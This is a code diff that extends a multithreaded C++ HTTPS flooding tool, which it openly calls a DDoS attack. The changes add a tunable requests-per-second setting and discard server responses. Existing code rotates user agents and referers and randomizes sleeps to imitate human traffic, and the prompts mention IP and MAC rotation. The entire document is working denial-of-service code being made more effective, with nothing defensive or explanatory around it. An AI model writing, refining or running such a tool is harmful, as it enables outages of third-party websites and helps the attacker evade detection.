@@ -44,8 +44,13 @@ string random_user_agent() {
     return user_agents[rand() % user_agents.size()];
 }
 
+// Function to discard the response body from the server
+size_t discard_response(void *ptr, size_t size, size_t nmemb, void *data) {
+    return size * nmemb; // Do nothing with the response data
+}
+
 // Function to simulate DDoS attack on HTTPS
-void https_attack(const string& url, const string& method, int id, int interval, ofstream& log) {
+void https_attack(const string& url, const string& method, int id, int interval, int requests_per_second, ofstream& log) {
     CURL *curl;
     CURLcode res;
     int success = 0;
@@ -71,7 +76,9 @@ void https_attack(const string& url, const string& method, int id, int interval,
 
             curl_easy_setopt(curl, CURLOPT_USERAGENT, user_agent.c_str());
             curl_easy_setopt(curl, CURLOPT_REFERER, referer_header.c_str());
-            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);
+
+            // Discard response body by using a custom write function
+            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, discard_response);
             curl_easy_setopt(curl, CURLOPT_NOPROGRESS, 1L);
             curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
 
@@ -83,7 +90,7 @@ void https_attack(const string& url, const string& method, int id, int interval,
 
             if (res == CURLE_OK) {
                 success++;
-                cout << GREEN << "[T" << id << "] Attack Success (" << duration.count() << "ms)" << RESET << endl;
+                cout << GREEN << "[T" << id << "] Packet Sent (" << duration.count() << "ms)" << RESET << endl;
             } else {
                 cout << RED << "[T" << id << "] Failed: " << curl_easy_strerror(res) << RESET << endl;
                 break;
@@ -98,7 +105,7 @@ void https_attack(const string& url, const string& method, int id, int interval,
             curl_easy_cleanup(curl);
             curl_slist_free_all(headers);
 
-            // Randomize sleep time to simulate user behavior (human-like request intervals)
+            // Simulate random sleep to make it look like human traffic
             int sleep_time = rand() % 3 + 1;  // Random sleep time between 1-3 seconds
             this_thread::sleep_for(chrono::seconds(sleep_time));
         }
@@ -132,7 +139,7 @@ int main() {
     print_banner();
 
     string url, method;
-    int threads, interval;
+    int threads, interval, requests_per_second;
 
     // Take inputs for the attack
     cout << CYAN << "[+] Target full URL (e.g. https://yourdomain.com): " << RESET;
@@ -143,6 +150,8 @@ int main() {
     cin >> threads;
     cout << CYAN << "[+] Time interval for IP and MAC rotation (seconds): " << RESET;
     cin >> interval;
+    cout << CYAN << "[+] Requests per second per thread: " << RESET;
+    cin >> requests_per_second;
 
     cout << GREEN << "[✔] Attack starting..." << RESET << endl;
 
@@ -150,7 +159,7 @@ int main() {
     ofstream log("https_attack_metrics.log", ios::app); // Open in append mode
     vector<thread> workers;
     for (int i = 0; i < threads; i++) {
-        workers.emplace_back(https_attack, url, method, i + 1, interval, ref(log));
+        workers.emplace_back(https_attack, url, method, i + 1, interval, requests_per_second, ref(log));
     }
 
     for (auto& t : workers) t.join();
